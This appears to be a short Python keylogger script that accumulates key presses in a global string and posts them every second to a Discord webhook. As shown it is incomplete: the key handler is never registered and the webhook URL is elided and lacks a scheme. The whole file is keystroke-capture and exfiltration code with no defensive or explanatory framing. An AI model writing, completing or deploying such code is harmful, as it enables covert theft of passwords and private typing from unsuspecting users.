import json
import time
import requests

x = False
l = ""

def on_key_press(event):
    global x, l
    l += event.key
    x = True

def send_to_webhook():
    global x, l
    if x:
        requests.post(
            "//discord.com/api/webhook/...",
            headers={"Content-Type": "application/json"},
            data=json.dumps({"content": l}),
        )
        x = False

while True:
    send_to_webhook()
    time.sleep(1)
